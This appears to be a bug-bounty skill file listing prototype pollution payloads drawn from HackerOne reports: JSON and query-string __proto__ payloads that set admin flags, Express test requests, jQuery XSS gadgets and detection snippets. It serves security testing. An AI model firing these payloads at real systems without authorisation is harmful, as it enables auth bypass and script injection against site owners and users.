---
name: "h1-prototype-pollution-techniques"
description: "Prototype Pollution patterns from HackerOne reports — lodash zipObjectDeep, jQuery, Express, and client-side PP leading to XSS, RCE, and DoS"
category: web-security
tags: ["prototype-pollution", "javascript", "lodash", "client-side", "hackerone"]
relevance: 8
---

# H1 Prototype Pollution Techniques

Real-world Prototype Pollution vulnerabilities ($250 bounty on lodash):

## 1. Server-Side Prototype Pollution
Report: lodash zipObjectDeep PP ($250)
- Test: `{"__proto__": {"admin": true}}` in JSON body
- Test: `{"constructor": {"prototype": {"isAdmin": true}}}`
- Impact: Modify application behavior, bypass auth checks

## 2. Client-Side Prototype Pollution
- Test: URL query params with `__proto__` in JS-heavy apps
- Payload: `?__proto__[polluted]=true`
- Payload: `?constructor[prototype][polluted]=true`
- Detection: Check `Object.prototype.polluted` in browser console

## 3. PP → XSS Chain
1. Find client-side PP gadget (jQuery, DOMPurify, etc.)
2. Pollute `Object.prototype` with XSS property
3. When library reads polluted property → XSS fires

## 4. Node.js Express Framework Testing
Test query parsers:
```
GET /api?__proto__[admin]=true
GET /api?constructor[prototype][admin]=true
Content-Type: application/json
{"__proto__": {"isAdmin": true}}
```

## 5. jQuery-Specific PP
Known jQuery PP gadgets:
- `Object.prototype.src` → script injection
- `Object.prototype.href` → link manipulation
- `Object.prototype.onload` → event handler injection

## Detection Payloads for PP:
```javascript
// Check if PP is possible
Object.prototype.polluted = "yes"
console.log({}.polluted)  // "yes" if vulnerable

// Server-side check
{ "__proto__": { "isAdmin": true } }

// Nested pollution
{ "constructor": { "prototype": { "admin": true } } }
```
